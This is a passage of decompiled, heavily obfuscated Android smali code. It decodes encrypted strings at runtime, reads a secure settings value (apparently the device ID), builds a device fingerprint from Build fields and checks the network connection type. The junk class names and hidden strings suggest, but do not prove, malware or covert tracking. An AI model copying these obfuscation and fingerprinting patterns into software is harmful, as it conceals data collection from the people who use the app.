    invoke-static {v2}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/g;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "z"

    invoke-static {v2}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/f;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "o"

    invoke-static {v2}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/g;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v10, v1}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;->zxcvxvsdvsvsvs(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v9, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v8, v1}, Lcompse/refact/st/upsssss/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    return-void

    :cond_0
    const-string v0, "d"

    invoke-static {v0}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/g;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    move-object v1, v0

    move-object v0, p0

    goto/16 :goto_0

    :cond_1
    invoke-virtual {p0}, Lcompse/refact/st/upsssss/Comm;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "f.c2h)c\u001fn$"

    invoke-static {v1}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/f;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, ""

    if-ne v0, v1, :cond_2

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "I`"

    invoke-static {v1}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/g;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v13, v1}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Landroid/os/Build;->BOARD:Ljava/lang/String;

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v1

    rem-int/lit8 v1, v1, 0xa

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Landroid/os/Build;->BRAND:Ljava/lang/String;

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v1

    rem-int/lit8 v1, v1, 0xa

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Landroid/os/Build;->CPU_ABI:Ljava/lang/String;

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v1

    rem-int/lit8 v1, v1, 0xa

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Landroid/os/Build;->DEVICE:Ljava/lang/String;

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v1

    rem-int/lit8 v1, v1, 0xa

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Landroid/os/Build;->DISPLAY:Ljava/lang/String;

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v1

    rem-int/lit8 v1, v1, 0xa

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Landroid/os/Build;->HOST:Ljava/lang/String;

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v1

    rem-int/lit8 v1, v1, 0xa

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Landroid/os/Build;->ID:Ljava/lang/String;

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v1

    rem-int/lit8 v1, v1, 0xa

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v1

    rem-int/lit8 v1, v1, 0xa

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v1

    rem-int/lit8 v1, v1, 0xa

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Landroid/os/Build;->PRODUCT:Ljava/lang/String;

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v1

    rem-int/lit8 v1, v1, 0xa

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Landroid/os/Build;->TAGS:Ljava/lang/String;

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v1

    rem-int/lit8 v1, v1, 0xa

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Landroid/os/Build;->TYPE:Ljava/lang/String;

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v1

    rem-int/lit8 v1, v1, 0xa

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Landroid/os/Build;->USER:Ljava/lang/String;

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v1

    rem-int/lit8 v1, v1, 0xa

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    :cond_2
    const-string v1, ""

    const-string v0, ""

    move-object v2, v1

    move-object v1, v0

    move-object v0, p0

    goto/16 :goto_1
.end method

.method public zxcvxvsdvsvsvs()Ljava/lang/String;
    .locals 4

    const/4 v2, 0x1

    const-string v0, ".(!"

    invoke-static {v0}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/f;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iget-object v0, p0, Lcompse/refact/st/upsssss/Comm;->sdvsdvsvsevsvsev:Landroid/content/Context;

    const-string v3, "\u0019:\u0014;\u001f6\u000e<\u000c<\u000e,"

    invoke-static {v3}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/g;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/ConnectivityManager;

    invoke-virtual {v0, v2}, Landroid/net/ConnectivityManager;->getNetworkInfo(I)Landroid/net/NetworkInfo;

    move-result-object v3

    invoke-virtual {v3}, Landroid/net/NetworkInfo;->isAvailable()Z

    move-result v3

    if-eqz v3, :cond_0

    const-string v0, "p)a)"

    invoke-static {v0}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/f;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    :goto_0
    return-object v0

    :cond_0
    invoke-virtual {v0}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v0

    invoke-virtual {v0}, Landroid/net/NetworkInfo;->getType()I

    move-result v0

    if-nez v0, :cond_1

    move v0, v2

    :goto_1
    if-eqz v0, :cond_2

    const-string v0, "\u0017:\u0018<\u00160"

    invoke-static {v0}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/g;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    goto :goto_0

    :cond_1
    const/4 v0, 0x0

    goto :goto_1

    :cond_2
    move-object v0, v1

    goto :goto_0
.end method
